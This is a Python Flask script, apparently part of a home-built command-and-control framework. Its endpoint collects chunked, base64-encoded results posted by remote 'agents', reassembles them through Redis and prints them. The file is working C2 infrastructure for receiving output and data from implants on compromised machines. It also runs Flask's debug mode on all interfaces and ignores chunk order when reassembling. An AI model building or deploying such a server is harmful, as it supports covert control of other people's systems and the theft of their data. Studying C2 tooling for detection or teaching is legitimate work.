#c2server.py is a simple flash application that is used to host the c2 server with varying domains and post as needed
from flask import Flask, render_template, request, jsonify
import base64 
import redis

#Initalize the flash application and point to the templates holder page
app = Flask(__name__, template_folder="templates")
#Intialize redis to store the data in the cache
r = redis.Redis() 

@app.route("/", methods=["GET"])
def home(): 
    return render_template("index.html")

@app.route("/results", methods=["POST"])
def reportChunk():
    '''
    Upon a POST request to /results, processes given chunks of the message, 
    see _send_results() in agent.py to see message format
    '''
    data = request.get_json()
    
    #Load in the data from the chunks
    message_id = data.get("message_id")
    agent_id = data.get("agent_id")
    chunk_size = data.get("chunk_size")
    chunk_index = data.get("chunk_index")
    chunk_count = data.get("chunk_count")
    chunk_data = data.get("chunk_data")

    print(chunk_index)
    print(chunk_count)
    
    #Store the chunk in the redis buffer for the corresponding agent and message id 

    #Create keys to be able to reference in redis
    # The flow is as follows chunks ->agents -> messages for agent -> chunk #1 for message 
    list_key = f"chunks:{agent_id}:{message_id}"
    
    #push the current chunk at the end of the list 
    r.rpush(list_key, chunk_data)

    #set the time to live of each of the keys (in seconds)
    r.expire(list_key, 600)
    
    #Check to see if the current chunk_count = chunk_size.
    #SUbtract by 1 as the chunk index starts at 0
    if chunk_index == chunk_count - 1: 
        print("I am going to reassemble")
        #We have everything to resassemble so pass in the list key
        result = reassemble(list_key)
    
        #Print the outputted result
        print(f"Output:")
        print(result)
    
    #return status required for flash
    return jsonify(status="ok"), 200

    
def reassemble(list_key): 
    '''
    Function that reassembles chunks that are stored 
    in a redis hash into a full message
    once all chunks have been sent
    '''
    parts = r.lrange(list_key, 0, -1)
    #combine all the parts
    message = b"".join(parts)
    return base64.b64decode(message) 

if __name__ == "__main__":
    # make sure you define KEY above if using app‑layer AES
    app.run(host="0.0.0.0", port=80, debug=True)

